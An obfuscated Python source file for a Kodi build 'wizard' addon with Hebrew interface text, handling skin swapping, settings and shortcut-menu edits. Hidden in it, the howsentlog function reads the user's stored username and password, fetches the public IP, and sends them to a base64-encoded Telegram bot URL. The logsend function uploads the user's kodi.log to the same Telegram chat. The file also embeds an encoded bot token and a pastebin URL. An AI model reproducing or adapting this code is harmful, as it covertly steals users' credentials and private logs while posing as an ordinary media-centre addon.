# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	O00O0OO00000OOO0O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O00000OOO000OOO0O =[];O00O0OO0OO000OOOO =[]#line:261
	for OO0000O0OO0OOO000 in sorted (O00O0OO00000OOO0O ,key =lambda O00OOO00O0O00000O :O00OOO00O0O00000O ):#line:262
		O0OOOO0O0O0O000O0 =os .path .split (OO0000O0OO0OOO000 [:-1 ])[1 ]#line:263
		O0000O0OO00O0OOO0 =os .path .join (OO0000O0OO0OOO000 ,'addon.xml')#line:264
		if os .path .exists (O0000O0OO00O0OOO0 ):#line:265
			OO000O0O00000O0OO =open (O0000O0OO00O0OOO0 )#line:266
			O000O000000O00OOO =OO000O0O00000O0OO .read ()#line:267
			O0O0O000000000000 =parseDOM2 (O000O000000O00OOO ,'addon',ret ='id')#line:268
			O00O0000O000O00OO =O0OOOO0O0O0O000O0 if len (O0O0O000000000000 )==0 else O0O0O000000000000 [0 ]#line:269
			try :#line:270
				O0O0O000OOO000OO0 =xbmcaddon .Addon (id =O00O0000O000O00OO )#line:271
				O00000OOO000OOO0O .append (O0O0O000OOO000OO0 .getAddonInfo ('name'))#line:272
				O00O0OO0OO000OOOO .append (O00O0000O000O00OO )#line:273
			except :#line:274
				pass #line:275
	O00000000OO0OOO0O =[];O0OO0O00O000OO0O0 =0 #line:276
	O0000O000OOOO0O00 =["Current Skin -- %s"%currSkin ()]+O00000OOO000OOO0O #line:277
	O0OO0O00O000OO0O0 =DIALOG .select ("Select the Skin you want to swap with.",O0000O000OOOO0O00 )#line:278
	if O0OO0O00O000OO0O0 ==-1 :return #line:279
	else :#line:280
		O0O0O00000OOO00OO =(O0OO0O00O000OO0O0 -1 )#line:281
		O00000000OO0OOO0O .append (O0O0O00000OOO00OO )#line:282
		O0000O000OOOO0O00 [O0OO0O00O000OO0O0 ]="%s"%(O00000OOO000OOO0O [O0O0O00000OOO00OO ])#line:283
	if O00000000OO0OOO0O ==None :return #line:284
	for O0OOO0OOOO000O0OO in O00000000OO0OOO0O :#line:285
		swapSkins (O00O0OO0OO000OOOO [O0OOO0OOOO000O0OO ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (OOO0O0OO0O000OOOO ,title ="Error"):#line:290
	OOO0OOOO000000OO0 ='lookandfeel.skin'#line:291
	O000OOO0OO0OO0OOO =OOO0O0OO0O000OOOO #line:292
	O0O00O0O00O0O00O0 =getOld (OOO0OOOO000000OO0 )#line:293
	OOOOO0O0OO0OOOOOO =OOO0OOOO000000OO0 #line:294
	setNew (OOOOO0O0OO0OOOOOO ,O000OOO0OO0OO0OOO )#line:295
	O00OO00OOO000O0O0 =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO00OOO000O0O0 <100 :#line:297
		O00OO00OOO000O0O0 +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (O00O00O0O0O0O0O0O ):#line:304
	try :#line:305
		O00O00O0O0O0O0O0O ='"%s"'%O00O00O0O0O0O0O0O #line:306
		OO00O00OO0000O0OO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O00O00O0O0O0O0O0O )#line:307
		O0OOO0OO0O0OOOOO0 =xbmc .executeJSONRPC (OO00O00OO0000O0OO )#line:309
		O0OOO0OO0O0OOOOO0 =simplejson .loads (O0OOO0OO0O0OOOOO0 )#line:310
		if O0OOO0OO0O0OOOOO0 .has_key ('result'):#line:311
			if O0OOO0OO0O0OOOOO0 ['result'].has_key ('value'):#line:312
				return O0OOO0OO0O0OOOOO0 ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (O00O0O0OOO0000OO0 ,OOOO000OO000O0O0O ):#line:319
	try :#line:320
		O00O0O0OOO0000OO0 ='"%s"'%O00O0O0OOO0000OO0 #line:321
		OOOO000OO000O0O0O ='"%s"'%OOOO000OO000O0O0O #line:322
		OO0O00O0000O00O00 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O00O0O0OOO0000OO0 ,OOOO000OO000O0O0O )#line:323
		O0OOO0000OO0O0OO0 =xbmc .executeJSONRPC (OO0O00O0000O00O00 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			OOO0O00OOO0OOO000 =xbmcgui .DialogProgress ()#line:334
			OOO0O00OOO0OOO000 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			OOO0O00OOO0OOO000 .update (0 )#line:338
			for O000O0OOOOOO0O0OO in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				OOO0O00OOO0OOO000 .update (int ((5 -O000O0OOOOOO0O0OO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O000O0OOOOOO0O0OO ),'')#line:341
				if OOO0O00OOO0OOO000 .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			OOO0O00OOO0OOO000 =xbmcgui .DialogProgress ()#line:347
			OOO0O00OOO0OOO000 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			OOO0O00OOO0OOO000 .update (0 )#line:351
			for O000O0OOOOOO0O0OO in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				OOO0O00OOO0OOO000 .update (int ((5 -O000O0OOOOOO0O0OO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O000O0OOOOOO0O0OO ),'')#line:354
				if OOO0O00OOO0OOO000 .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:365
  wiz .kodi17Fix ()#line:366
def howsentlog ():#line:368
       try :#line:369
          import json #line:370
          OO0O0OOOOO00O000O =(ADDON .getSetting ("user"))#line:371
          O000O000OO0O000OO =(ADDON .getSetting ("pass"))#line:372
          O00O0000OO0OO0OOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:373
          OOO0OOOOOOO00OOO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:375
          OO0OO000O000000O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:376
          OOOOOO0000O00OO00 =str (json .loads (OO0OO000O000000O0 )['ip'])#line:377
          O0OOO0O00OO00O000 =OO0O0OOOOO00O000O #line:378
          O000O000O00OOO000 =O000O000OO0O000OO #line:379
          import socket #line:381
          OO0OO000O000000O0 =urllib2 .urlopen (OOO0OOOOOOO00OOO0 .decode ('base64')+' - '+O0OOO0O00OO00O000 +' - '+O000O000O00OOO000 +' - '+O00O0000OO0OO0OOO ).readlines ()#line:382
       except :pass #line:383
def googleindicat ():#line:386
			import logg #line:387
			O0OOOO0O0O0OO0000 =(ADDON .getSetting ("pass"))#line:388
			O00O0O0O0O0OO0O00 =(ADDON .getSetting ("user"))#line:389
			logg .logGA (O0OOOO0O0O0OO0000 ,O00O0O0O0O0OO0O00 )#line:390
def logsend ():#line:391
    howsentlog ()#line:392
    import requests #line:393
    if xbmc .getCondVisibility ('system.platform.windows'):#line:394
       OOOOO000OOOOOO000 =xbmc .translatePath ('special://home/kodi.log')#line:395
       O00OO0O0OO0OO0OOO ={'chat_id':(None ,'-274262389'),'document':(OOOOO000OOOOOO000 ,open (OOOOO000OOOOOO000 ,'rb')),}#line:399
       OOO0000OO00O000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:400
       OO0OO000000OOO000 =requests .post (OOO0000OO00O000OO .decode ('base64'),files =O00OO0O0OO0OO0OOO )#line:402
    elif xbmc .getCondVisibility ('system.platform.android'):#line:403
         OOOOO000OOOOOO000 =xbmc .translatePath ('special://temp/kodi.log')#line:404
         O00OO0O0OO0OO0OOO ={'chat_id':(None ,'-274262389'),'document':(OOOOO000OOOOOO000 ,open (OOOOO000OOOOOO000 ,'rb')),}#line:408
         OOO0000OO00O000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:409
         OO0OO000000OOO000 =requests .post (OOO0000OO00O000OO .decode ('base64'),files =O00OO0O0OO0OO0OOO )#line:411
    else :#line:412
         OOOOO000OOOOOO000 =xbmc .translatePath ('special://profile/kodi.log')#line:413
         O00OO0O0OO0OO0OOO ={'chat_id':(None ,'-274262389'),'document':(OOOOO000OOOOOO000 ,open (OOOOO000OOOOOO000 ,'rb')),}#line:417
         OOO0000OO00O000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:418
         OO0OO000000OOO000 =requests .post (OOO0000OO00O000OO .decode ('base64'),files =O00OO0O0OO0OO0OOO )#line:420
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:421
def rdoff ():#line:423
	resloginit .resloginit ('restore','all')#line:425
	O0O0OO00OOO0OOOOO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:426
	OOOOO0O00O0O000OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:427
	copyfile (O0O0OO00OOO0OOOOO ,OOOOO0O00O0O000OO )#line:428
def skindialogsettind18 ():#line:429
	try :#line:430
		OOO000OOOOO0OO000 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:431
		OOO0OOO000O0O0OO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:432
		copyfile (OOO000OOOOO0OO000 ,OOO0OOO000O0O0OO0 )#line:433
	except :pass #line:434
def rdon ():#line:435
	loginit .loginIt ('restore','all')#line:436
	OOO0OOO000O0O000O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:438
	OO000OOOO0O00O00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:439
	copyfile (OOO0OOO000O0O000O ,OO000OOOO0O00O00O )#line:440
def adults18 ():#line:442
  OO000OOOOOOO00OO0 =(ADDON .getSetting ("adults"))#line:443
  if OO000OOOOOOO00OO0 =='true':#line:444
    OOO0O0O0OOO0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:445
    with open (OOO0O0O0OOO0000OO ,'r')as OOO0OOOO00OO0OO0O :#line:446
      O0O0O000O0OOO0OO0 =OOO0OOOO00OO0OO0O .read ()#line:447
    O0O0O000O0OOO0OO0 =O0O0O000O0OOO0OO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:465
    with open (OOO0O0O0OOO0000OO ,'w')as OOO0OOOO00OO0OO0O :#line:468
      OOO0OOOO00OO0OO0O .write (O0O0O000O0OOO0OO0 )#line:469
def rdbuildaddon ():#line:470
  O00O00O0O0OOO00O0 =(ADDON .getSetting ("rdbuild"))#line:471
  if O00O00O0O0OOO00O0 =='true':#line:472
    O00OO0OOOOOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:473
    with open (O00OO0OOOOOO000O0 ,'r')as O000O0OOOOO0OOO0O :#line:474
      OO0OO0O0O0O0O0O0O =O000O0OOOOO0OOO0O .read ()#line:475
    OO0OO0O0O0O0O0O0O =OO0OO0O0O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:493
    with open (O00OO0OOOOOO000O0 ,'w')as O000O0OOOOO0OOO0O :#line:496
      O000O0OOOOO0OOO0O .write (OO0OO0O0O0O0O0O0O )#line:497
    O00OO0OOOOOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:501
    with open (O00OO0OOOOOO000O0 ,'r')as O000O0OOOOO0OOO0O :#line:502
      OO0OO0O0O0O0O0O0O =O000O0OOOOO0OOO0O .read ()#line:503
    OO0OO0O0O0O0O0O0O =OO0OO0O0O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:521
    with open (O00OO0OOOOOO000O0 ,'w')as O000O0OOOOO0OOO0O :#line:524
      O000O0OOOOO0OOO0O .write (OO0OO0O0O0O0O0O0O )#line:525
    O00OO0OOOOOO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:529
    with open (O00OO0OOOOOO000O0 ,'r')as O000O0OOOOO0OOO0O :#line:530
      OO0OO0O0O0O0O0O0O =O000O0OOOOO0OOO0O .read ()#line:531
    OO0OO0O0O0O0O0O0O =OO0OO0O0O0O0O0O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:549
    with open (O00OO0OOOOOO000O0 ,'w')as O000O0OOOOO0OOO0O :#line:552
      O000O0OOOOO0OOO0O .write (OO0OO0O0O0O0O0O0O )#line:553
